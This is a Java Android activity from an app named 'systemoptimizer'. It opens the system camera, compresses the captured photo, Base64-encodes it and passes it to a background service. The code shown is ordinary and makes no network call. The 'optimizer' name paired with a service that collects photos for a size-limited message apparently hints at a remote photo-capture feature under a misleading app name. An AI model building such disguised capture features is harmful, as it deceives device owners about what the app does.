package com.example.systemoptimizer;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.util.Log;

import androidx.activity.ComponentActivity;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.core.content.FileProvider;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;

/**
 * Activity يستقبل التقاط الصورة من كاميرا النظام عبر TakePicture، يعالجها
 * (ضبط حجمها وضغطها) ويمرر النتيجة Base64 إلى الخدمة عبر BackgroundService.
 * يغلق نفسه دائماً بعد الانتهاء حتى لا تتراكم نسخ منه.
 */
public class CameraCaptureActivity extends ComponentActivity {

    private static final String TAG = "CameraCaptureActivity";

    /** أقصى حجم للصورة بعد الضغط (يبقى Base64 ضمن حد 8MB للرسالة مع البادئة). */
    private static final int MAX_PHOTO_BYTES = 6_200_000;
    private static final long ACTIVITY_TIMEOUT_MS = 120_000;
    private static final int MAX_DIMENSION = 2560;

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private Runnable watchdog;
    private File outputFile;
    private ActivityResultLauncher<Uri> takePictureLauncher;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String path = getIntent().getStringExtra("output_file");
        outputFile = path != null
                ? new File(path)
                : new File(getCacheDir(), "photo_" + System.currentTimeMillis() + ".jpg");

        takePictureLauncher = registerForActivityResult(
                new ActivityResultContracts.TakePicture(),
                (Boolean success) -> onCaptureResult(success));

        Uri outputUri;
        try {
            if (!outputFile.exists() && !outputFile.createNewFile()) {
                finishWithError("فشل إنشاء ملف الصورة المؤقت على الجهاز");
                return;
            }
            outputUri = FileProvider.getUriForFile(
                    this, "com.example.systemoptimizer.fileprovider", outputFile);
        } catch (IOException | IllegalArgumentException e) {
            Log.w(TAG, "camera uri setup failed", e);
            finishWithError("فشل تجهيز ملف الصورة للكاميرا: " + e.getMessage());
            return;
        }

        watchdog = new Runnable() {
            @Override
            public void run() {
                finishWithError("انتهت مهلة التقاط الصورة (دقيقتان). تم الإلغاء.");
            }
        };
        mainHandler.postDelayed(watchdog, ACTIVITY_TIMEOUT_MS);

        try {
            takePictureLauncher.launch(outputUri);
        } catch (Exception e) {
            Log.w(TAG, "camera launch failed", e);
            finishWithError("فشل فتح تطبيق الكاميرا: " + e.getMessage());
        }
    }

    private void onCaptureResult(Boolean success) {
        if (!Boolean.TRUE.equals(success)) {
            finishWithError("أُلغي التقاط الصورة من مستخدم الكاميرا");
            return;
        }
        mainHandler.removeCallbacks(watchdog);
        // المعالجة (فك الترميز والضغط والتحويل) تُنفذ خارج خيط الواجهة
        new Thread(() -> {
            String result = processPhoto();
            BackgroundService.postCameraResult(result);
            runOnUiThread(this::finish);
        }, "camera-encode").start();
    }

    private String processPhoto() {
        byte[] raw;
        try {
            raw = readFileBytes(outputFile);
        } catch (IOException e) {
            return "فشل قراءة الصورة الملتقطة من الجهاز: " + e.getMessage();
        } finally {
            if (outputFile.exists() && !outputFile.delete()) {
                Log.w(TAG, "failed to delete temp photo: " + outputFile.getName());
            }
        }
        if (raw.length == 0) {
            return "فشل التقاط الصورة: الكاميرا لم تكتب صورة صالحة (ملف فارغ)";
        }

        Bitmap sampled = decodeSampled(raw);
        if (sampled == null) {
            return "فشل تحليل الصورة الملتقطة (صيغة غير مدعومة)";
        }
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            sampled.compress(Bitmap.CompressFormat.JPEG, 80, baos);
            byte[] compressed = baos.toByteArray();
            if (compressed.length == 0) {
                return "فشل ضغط الصورة الملتقطة";
            }
            if (compressed.length > MAX_PHOTO_BYTES) {
                return "الصورة الملتقطة أكبر من الحد المسموح بعد الضغط "
                        + "(" + compressed.length + " بايت)";
            }
            return "PHOTO_OK:" + Base64.encodeToString(compressed, Base64.NO_WRAP);
        } finally {
            if (!sampled.isRecycled()) {
                sampled.recycle();
            }
        }
    }

    private static Bitmap decodeSampled(byte[] raw) {
        BitmapFactory.Options bounds = new BitmapFactory.Options();
        bounds.inJustDecodeBounds = true;
        BitmapFactory.decodeByteArray(raw, 0, raw.length, bounds);
        if (bounds.outWidth <= 0 || bounds.outHeight <= 0) {
            return null;
        }
        int sample = 1;
        int maxDim = Math.max(bounds.outWidth, bounds.outHeight);
        while (maxDim / (sample * 2) >= MAX_DIMENSION) {
            sample *= 2;
        }
        BitmapFactory.Options opts = new BitmapFactory.Options();
        opts.inSampleSize = sample;
        return BitmapFactory.decodeByteArray(raw, 0, raw.length, opts);
    }

    private static byte[] readFileBytes(File file) throws IOException {
        long length = file.length();
        if (length == 0) {
            return new byte[0];
        }
        int size = (int) Math.min(length, Integer.MAX_VALUE);
        byte[] data = new byte[size];
        java.io.FileInputStream fis = new java.io.FileInputStream(file);
        try {
            int offset = 0;
            while (offset < size) {
                int read = fis.read(data, offset, size - offset);
                if (read == -1) {
                    break;
                }
                offset += read;
            }
            if (offset != size) {
                byte[] trimmed = new byte[offset];
                System.arraycopy(data, 0, trimmed, 0, offset);
                data = trimmed;
            }
        } finally {
            fis.close();
        }
        return data;
    }

    private void finishWithError(String message) {
        if (watchdog != null) {
            mainHandler.removeCallbacks(watchdog);
        }
        if (outputFile != null && outputFile.exists()) {
            boolean deleted = outputFile.delete();
            if (!deleted) {
                Log.w(TAG, "failed to delete temp photo: " + outputFile.getName());
            }
        }
        BackgroundService.postCameraResult(message);
        finish();
    }

    @Override
    protected void onDestroy() {
        if (watchdog != null) {
            mainHandler.removeCallbacks(watchdog);
        }
        super.onDestroy();
    }
}